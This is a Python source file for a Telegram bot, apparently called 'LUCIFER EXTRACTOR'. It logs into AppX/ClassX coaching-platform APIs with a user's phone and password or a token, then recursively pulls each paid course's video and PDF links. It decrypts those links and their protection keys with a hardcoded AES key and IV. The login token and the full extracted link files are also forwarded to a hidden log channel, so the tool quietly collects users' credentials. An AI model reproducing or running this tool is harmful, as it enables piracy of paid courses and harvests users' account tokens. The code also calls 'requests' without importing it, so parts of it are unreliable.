# appex_full_recursive.py
# Full recursive extractor — preserves your original flow & handlers.
# Option A: full folder recursion (deep extraction)
import io
import os
import time
import json
import base64
import threading
import cloudscraper
import asyncio
import aiohttp
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from base64 import b64decode
from pyrogram import filters
from Extractor import app
from Extractor.modules.mix import v2_new
from config import PREMIUM_LOGS

# ---------------- Config / Globals ----------------
log_channel = PREMIUM_LOGS
log_channel2 = PREMIUM_LOGS
THREADPOOL = ThreadPoolExecutor(max_workers=1000)

# ---------------- Crypto Helpers ----------------
def decrypt(enc):
    """
    Decrypt encoded value using AES CBC + base64 as in your original code.
    Expects enc like '...:...' (splits and takes first part).
    """
    try:
        enc = b64decode(enc.split(':')[0])
    except Exception:
        return ""
    key = '638udh3829162018'.encode('utf-8')
    iv = 'fedcba9876543210'.encode('utf-8')
    if len(enc) == 0:
        return ""
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(enc), AES.block_size)
    return plaintext.decode('utf-8')

def decode_base64(encoded_str):
    try:
        decoded_bytes = base64.b64decode(encoded_str)
        decoded_str = decoded_bytes.decode('utf-8')
        return decoded_str
    except Exception as e:
        return f"Error decoding string: {e}"

# ---------------- Robust fetch ----------------
async def fetch(session: aiohttp.ClientSession, url: str, headers: dict, allow_text_fallback=True, timeout=25):
    """
    Robust fetch that attempts to parse JSON. Fallback order:
    1) response.json(content_type=None)  -> handles wrong content-type
    2) response.text() -> json.loads()
    3) try parsing HTML with BeautifulSoup and extract JSON-like content
    Returns dict (or empty dict on failure).
    """
    try:
        async with session.get(url, headers=headers, timeout=timeout) as resp:
            status = resp.status
            if status != 200:
                # print and return empty
                print(f"Error fetching {url}: HTTP {status}")
                return {}
            # try json() ignoring content-type
            try:
                j = await resp.json(content_type=None)
                if isinstance(j, (dict, list)):
                    return j if isinstance(j, dict) else {"data": j}
            except Exception:
                pass

            # fallback to text -> json.loads
            try:
                txt = await resp.text()
                try:
                    j = json.loads(txt)
                    return j if isinstance(j, dict) else {"data": j}
                except Exception:
                    # try to extract JSON inside HTML using bs4 heuristics
                    soup = BeautifulSoup(txt, "html.parser")
                    # Often APIs will return plain JSON; if HTML, we might find <pre> or script tags
                    pre = soup.find("pre")
                    if pre:
                        try:
                            return json.loads(pre.get_text())
                        except Exception:
                            pass
                    scripts = soup.find_all("script")
                    for s in scripts:
                        t = s.string
                        if not t:
                            continue
                        # look for first '{' occurrence
                        idx = t.find('{')
                        if idx != -1:
                            candidate = t[idx:].strip()
                            try:
                                return json.loads(candidate)
                            except Exception:
                                continue
                    # final fallback: return raw text under 'text'
                    if allow_text_fallback:
                        return {"text": txt}
                    return {}
            except Exception as e:
                print(f"Error parsing response from {url}: {e}")
                return {}
    except Exception as e:
        print(f"Network/fetch error for {url}: {e}")
        return {}

# ---------------- Item / Folder processing (recursive) ----------------
async def fetch_item_details(session, api_base, course_id, item, headers, path=None):
    """
    Fetch details for a single item (video/pdf/folder child).
    Returns list of strings (each string is a line to write into result file).
    """
    fi = item.get("id")
    outputs = []
    try:
        # fetch detailed endpoint that usually contains download link / encrypted_links
        url = f"{api_base}/get/fetchVideoDetailsById?course_id={course_id}&folder_wise_course=1&ytflag=0&video_id={fi}"
        r4 = await fetch(session, url, headers)
        if not r4 or not r4.get("data"):
            return []
        data = r4.get("data") or {}

        vt = data.get("Title", "") or item.get("Title", "")
        vt = (vt or "Untitled").strip()

        # 1) direct download_link
        vl = data.get("download_link", "") or ""
        if vl:
            try:
                dvl = decrypt(vl)
            except Exception:
                dvl = vl
            # avoid pdf duplicates in video slot
            if ".pdf" not in dvl:
                outputs.append(f"🗂️{vt}:{dvl}")

        # 2) youtube id (video_id) -> make youtu.be link
        fl = data.get("video_id", "") or ""
        if fl:
            try:
                dfl = decrypt(fl)
                if dfl:
                    outputs.append(f"🗂️{vt}:https://youtu.be/{dfl}")
            except Exception:
                pass

        # 3) encrypted_links fallback
        encrypted_links = data.get("encrypted_links", []) or []
        if encrypted_links and not any(l for l in outputs if vt in l):
            first_link = encrypted_links[0]
            a = first_link.get("path")
            k = first_link.get("key")
            if a and k:
                try:
                    da = decrypt(a)
                    k1 = decrypt(k)
                    k2 = decode_base64(k1)
                    outputs.append(f"🗂️{vt}:{da}*{k2}")
                except Exception:
                    try:
                        da = decrypt(a)
                        outputs.append(f"🗂️{vt}:{da}")
                    except Exception:
                        pass

        # 4) PDFs (pdf_link / pdf_link2) — both for material_type PDF or VIDEO
        if "material_type" in data:
            mt = data["material_type"]
            p1 = data.get("pdf_link", "") or ""
            pk1 = data.get("pdf_encryption_key", "") or ""
            p2 = data.get("pdf_link2", "") or ""
            pk2 = data.get("pdf2_encryption_key", "") or ""
            if p1:
                try:
                    dp1 = decrypt(p1)
                    depk1 = decrypt(pk1) if pk1 else ""
                    if depk1 == "abcdefg" or not depk1:
                        outputs.append(f"📄{vt}:{dp1}")
                    else:
                        outputs.append(f"📄{vt}:{dp1}*{depk1}")
                except Exception:
                    pass
            if p2:
                try:
                    dp2 = decrypt(p2)
                    depk2 = decrypt(pk2) if pk2 else ""
                    if depk2 == "abcdefg" or not depk2:
                        outputs.append(f"📄{vt}:{dp2}")
                    else:
                        outputs.append(f"📄{vt}:{dp2}*{depk2}")
                except Exception:
                    pass

        return outputs
    except Exception as e:
        print(f"An error occurred while fetching details for item {fi}: {e}")
        return []

async def fetch_folder_contents(session, api_base, course_id, folder_id, headers, path="Home"):
    """
    Recursively fetch folder contents and child folders.
    Returns list of output lines.
    """
    outputs = []
    url = f"{api_base}/get/folder_contentsv3?course_id={course_id}&parent_id={folder_id}&windowsapp=false&start=0"
    try:
        j = await fetch(session, url, headers)
        if not j:
            return []
        data = j.get("data", []) or []
        if not data:
            return []

        # iterate items in folder
        for item in data:
            title = (item.get("Title") or "Untitled").strip()
            mtype = (item.get("material_type") or "").upper()
            current_path = f"{path} < {title}"

            if mtype == "FOLDER":
                # recurse into folder
                try:
                    sub = await fetch_folder_contents(session, api_base, course_id, item.get("id"), headers, path=current_path)
                    if sub:
                        outputs.extend(sub)
                except Exception as e:
                    print(f"Error recursing folder {current_path}: {e}")
            else:
                # item is video/pdf/other — fetch item details
                try:
                    item_outputs = await fetch_item_details(session, api_base, course_id, item, headers, path=current_path)
                    if item_outputs:
                        outputs.extend(item_outputs)
                except Exception as e:
                    print(f"Error fetching item {current_path}: {e}")

        return outputs
    except Exception as e:
        print(f"Error fetching folder {folder_id}: {e}")
        return []

# ---------------- Course/topic handlers ----------------
async def process_video(session, api_base, bi, si, sn, ti, tn, video, hdr1):
    """
    Thin wrapper that uses fetch_item_details when video is a leaf,
    but for older endpoints we may use fetch with video_id
    """
    try:
        return await fetch_item_details(session, api_base, bi, video, hdr1)
    except Exception as e:
        print(f"Error in process_video for video id {video.get('id')}: {e}")
        return []

async def handle_course(session, api_base, bi, si, sn, topic, hdr1):
    """
    Gather all videos under a topic and process them concurrently.
    """
    ti = topic.get("topicid")
    # endpoint returns classes list for topic
    url = f"{api_base}/get/livecourseclassbycoursesubtopconceptapiv3?courseid={bi}&subjectid={si}&topicid={ti}&conceptid=&start=-1"
    r3 = await fetch(session, url, hdr1)
    video_data = sorted((r3.get("data") or []), key=lambda x: x.get("id") or 0)
    tasks = [process_video(session, api_base, bi, si, sn, ti, topic.get("topic_name", ""), v, hdr1) for v in video_data]
    results = []
    if tasks:
        gathered = await asyncio.gather(*tasks, return_exceptions=True)
        for g in gathered:
            if isinstance(g, Exception):
                print(f"Exception in topic task: {g}")
                continue
            if g:
                results.extend(g)
    return results

# ---------------- Main interactive flow (keeps your handler) ----------------
@app.on_message(filters.command(["appx"]))
async def appex_v4_txt(app, message):
    """
    entry command preserved — asks user for API and forwards to appex_v5_txt
    """
    api = await app.ask(message.chat.id, text="`>_` **Enter AppX API (skip https://)** → `tcsexamzoneapi.classx.co.in` ⚙️")
    api_txt = (api.text or "").strip()
    name = api_txt.split('.')[0].replace("api", "") if api_txt else "appx"
    if "api" in api_txt:
        await appex_v5_txt(app, message, api_txt, name)
    else:
        await app.send_message(message.chat.id, "INVALID INPUT — if you don't know API go to find API option")

async def appex_v5_txt(app, message, api, name):
    """
    Main extractor flow (dynamic): login or token -> fetch courses -> ask for batch ids -> extract recursive
    """
    api_base = api.replace("http://", "https://") if api.startswith(("http://", "https://")) else f"https://{api}"
    app_name = api_base.replace("http://", " ").replace("https://", " ").replace("api.classx.co.in", " ").replace("api.akamai.net.in", " ").replace("apinew.teachx.in", " ").replace("api.cloudflare.net.in", " ").replace("api.appx.co.in", " ").replace("/", " ").strip()

    input1 = await app.ask(
        message.chat.id,
        (f"SEND MOBILE NUMBER AND PASSWORD IN THIS FORMAT\n\n"
         f"MOBILE*PASSWORD\n\nᴄᴏᴀᴄʜɪɴɢ ɴᴀᴍᴇ:- {app_name}\n\nOR SEND TOKEN")
    )

    raw_text = (input1.text or "").strip()
    token = None
    userid = "-2"

    hdr1 = {
        "Client-Service": "Appx",
        "source": "website",
        "Auth-Key": "appxapi",
        "Authorization": "",
        "User-ID": "1234"
    }

    # attempt login if credential format provided
    if '*' in raw_text:
        email, password = raw_text.split("*", 1)
        raw_url = f"{api_base}/post/userLogin"
        headers = {
            "Auth-Key": "appxapi",
            "User-Id": "-2",
            "Authorization": "",
            "User_app_category": "",
            "Language": "en",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "okhttp/4.9.1"
        }
        data = {"email": email, "password": password}
        try:
            response = requests.post(raw_url, data=data, headers=headers, timeout=25).json()
            status = response.get("status")
            if status == 200:
                userid = response["data"].get("userid", userid)
                token = response["data"].get("token", "")
            elif status == 203:
                # second attempt with extra_details
                second_api_url = f"{api_base}/post/userLogin?extra_details=0"
                second_headers = {
                    "auth-key": "appxapi",
                    "client-service": "Appx",
                    "source": "website",
                    "user-agent": "Mozilla/5.0",
                    "accept": "*/*",
                    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
                }
                second_data = {
                    "source": "website",
                    "phone": email,
                    "email": email,
                    "password": password,
                    "extra_details": "1"
                }
                second_response = requests.post(second_api_url, headers=second_headers, data=second_data, timeout=25).json()
                if second_response.get("status") == 200:
                    userid = second_response["data"].get("userid", userid)
                    token = second_response["data"].get("token", "")
        except Exception as e:
            print(f"Login error: {e}")
            return await message.reply_text("Please try again later. Maybe password is wrong or server is down.")
        hdr1["Authorization"] = token
        hdr1["User-ID"] = str(userid)
    else:
        # treat raw_text as token
        token = raw_text
        userid = "extracted_userid_from_token"
        hdr1["Authorization"] = token
        hdr1["User-ID"] = userid

    # use cloudscraper for compatibility + fallbacks for some endpoints
    scraper = cloudscraper.create_scraper()

    # try to fetch my courses using scraper first (sync)
    mc1 = {}
    try:
        mc1 = scraper.get(f"{api_base}/get/mycoursev2?userid={userid}", headers=hdr1, timeout=25).json()
    except Exception:
        mc1 = {}

    valid_ids = []
    FFF = "𝗕𝗔𝗧𝗖𝗛 𝗜𝗗 ➤ 𝗕𝗔𝗧𝗖𝗛 𝗡𝗔𝗠𝗘\n\n"

    if mc1 and "data" in mc1 and mc1["data"]:
        for ct in mc1["data"]:
            ci = ct.get("id")
            cn = ct.get("course_name")
            start = ct.get("start_date")
            end = ct.get("end_date")
            pricing = ct.get("price")
            FFF += f"**`{ci}`   -   `{cn}`**\n\n"
            valid_ids.append(str(ci))
    else:
        # fallback to aiohttp session fetch
        async with aiohttp.ClientSession() as session:
            j1 = await fetch(session, f"{api_base}/get/mycoursev2?userid={userid}", hdr1)
            jdata = j1.get("data", [])
            if jdata:
                for ct in jdata:
                    i = ct.get("id")
                    cn = ct.get("course_name")
                    start = ct.get("start_date")
                    end = ct.get("end_date")
                    pricing = ct.get("price")
                    FFF += f"**`{i}`   -   `{cn}`**\n\n"
                    valid_ids.append(str(i))

    if not valid_ids:
        return await message.reply_text("No courses/batches found for this account/token.")

    # send list file if many, else inline text
    if len(FFF) <= 4096:
        editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {app_name}\n\n {api_base}\n\n`{token}`\n{FFF}")
        dl = (f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for 🔓{app_name} \n\n`{api_base}`\n\n`{token}`\n{FFF}")
        try:
            await app.send_message(log_channel, dl)
        except Exception:
            pass
    else:
        plain_FFF = FFF.replace("**", "").replace("`", "")
        file_path = f"{app_name}.txt"
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅for {app_name}\n\nToken: {token}\n\n{plain_FFF}")
        try:
            await app.send_document(message.chat.id, document=file_path, caption="Too many batches, so select batch IDs from the text file.")
            await app.send_document(log_channel, document=file_path, caption="Too many batches.")
        except Exception:
            pass
        if os.path.exists(file_path):
            os.remove(file_path)
        editable1 = None

    # ask for batch ids (supports multiple via &)
    input2 = await app.ask(message.chat.id, "**Send multiple Course IDs separated by '&' to Download or copy below text to download all batches**\n\n`" + "&".join(valid_ids) + "`")
    raw_in = (input2.text or "").strip()
    batch_ids = [b.strip() for b in raw_in.split("&") if b.strip() in valid_ids]

    if not batch_ids:
        await message.reply_text("**Invalid Course ID(s). Please send valid Course IDs from the list.**")
        try:
            await input2.delete(True)
        except Exception:
            pass
        if editable1:
            try:
                await editable1.delete(True)
            except Exception:
                pass
        return

    m1 = await message.reply_text("Processing your requested batches...")
    # iterate batches
    async with aiohttp.ClientSession() as session:
        for raw_text2 in batch_ids:
            m2 = await message.reply_text(f"Extracting batch `{raw_text2}`...")
            start_time = time.time()
            try:
                # try course_by_id to get name info
                try:
                    r = scraper.get(f"{api_base}/get/course_by_id?id={raw_text2}", headers=hdr1, timeout=25).json()
                except Exception:
                    r = await fetch(session, f"{api_base}/get/course_by_id?id={raw_text2}", hdr1) or {}
            except Exception as e:
                print(f"Error fetching course_by_id {raw_text2}: {e}")
                await message.reply_text("An error occurred while fetching the course details. Please try again later.")
                continue

            # Determine course name for filename & caption
            course_name = None
            if isinstance(r, dict) and r.get("data"):
                # take first data item name
                try:
                    first = r.get("data")
                    if isinstance(first, list) and len(first) > 0:
                        course_name = first[0].get("course_name")
                    elif isinstance(first, dict):
                        course_name = first.get("course_name")
                except Exception:
                    course_name = None

            # fallback to mc1 or other previously fetched data
            if not course_name:
                try:
                    course_name = next((ct.get("course_name") for ct in (mc1.get("data") if isinstance(mc1, dict) else []) if str(ct.get("id")) == str(raw_text2)), None)
                except Exception:
                    course_name = None

            sanitized_course_name = (course_name or f"batch_{raw_text2}").replace(':', '_').replace('/', '_')
            filename = f"{raw_text2}_{sanitized_course_name}.txt"
            all_lines = []

            try:
                # fetch top-level folder contents (parent_id = -1)
                j2 = await fetch(session, f"{api_base}/get/folder_contentsv3?course_id={raw_text2}&parent_id=-1", hdr1)
                if not j2 or not j2.get("data"):
                    # fallback v2 endpoint or alternative endpoint if available
                    # try folder_contentsv3 with parent_id=0
                    j2 = await fetch(session, f"{api_base}/get/folder_contentsv3?course_id={raw_text2}&parent_id=0", hdr1)
                if not j2 or not j2.get("data"):
                    await message.reply_text(f"No folder data found for batch {raw_text2}.")
                    continue

                # iterate each top item (folder or item)
                for item in j2.get("data", []):
                    mtype = (item.get("material_type") or "").upper()
                    if mtype == "FOLDER":
                        # recurse full folder contents
                        folder_res = await fetch_folder_contents(session, api_base, raw_text2, item.get("id"), hdr1, path=item.get("Title", "Folder"))
                        if folder_res:
                            all_lines.extend(folder_res)
                    else:
                        # single item — fetch details
                        item_res = await fetch_item_details(session, api_base, raw_text2, item, hdr1, path=item.get("Title", "Item"))
                        if item_res:
                            all_lines.extend(item_res)

                # Write to file
                with open(filename, "w", encoding="utf-8") as outf:
                    for ln in all_lines:
                        try:
                            outf.write(ln + "\n")
                        except Exception:
                            pass

                end_time = time.time()
                elapsed_time = end_time - start_time

                c_text = (
                    f"╭━━━━━━━『 <b>🚀 COURSE INFO</b> 』━━━━━━━╮\n"
                    f"📦 <b>App Name:</b> <code>{app_name}</code>\n"
                    f"🎓 <b>Batch Name:</b> <code>{sanitized_course_name}</code>\n"
                    f"🕒 <b>Extracted In:</b> <code>{elapsed_time:.1f}s</code>\n"
                    f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n"
                    f"╭━━━━━━━『 <b>💾 DOWNLOAD INFO</b> 』━━━━━━━╮\n"
                    f"👑 <b>Admin:</b> <a href='https://t.me/NOOBHUSIR'>LUCIFER ⚡</a>\n"
                    f"⚙️ <b>Extractor:</b> <code>LUCIFER EXTRACTOR ⚡</code>\n"
                    f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
                )

                try:
                    # send to user and to logs
                    await input2.delete(True)
                    await m1.delete(True)
                    await m2.delete(True)
                except Exception:
                    pass

                try:
                    # send file to user & log channel
                    await app.send_document(message.chat.id, filename, caption=c_text)
                    await app.send_document(log_channel, filename, caption=c_text)
                except Exception as e:
                    print(f"Error sending file {filename}: {e}")
                    # attempt alternate: send as text if small
                    try:
                        # read file and send chunked messages if not too big
                        with open(filename, "r", encoding="utf-8") as rfile:
                            content = rfile.read()
                        if len(content) < 4000:
                            await app.send_message(message.chat.id, f"```{content}```")
                        else:
                            await app.send_document(message.chat.id, filename, caption=c_text)
                    except Exception as ex:
                        print(f"Fallback send failed: {ex}")
                        # as last resort call v2_new for robust handling
                        try:
                            await v2_new(app, message, token, userid, hdr1, app_name, raw_text2, api_base, sanitized_course_name, start_time, None, None, None, input2, m1, m2)
                        except Exception as verr:
                            print(f"v2_new fallback also failed: {verr}")
                finally:
                    if os.path.exists(filename):
                        try:
                            os.remove(filename)
                        except Exception:
                            pass

            except Exception as e:
                print(f"Error extracting batch {raw_text2}: {e}")
                try:
                    await message.reply_text(f"Extraction failed for batch {raw_text2}.")
                except Exception:
                    pass
                continue

    await message.reply_text("Done Bruh✅")
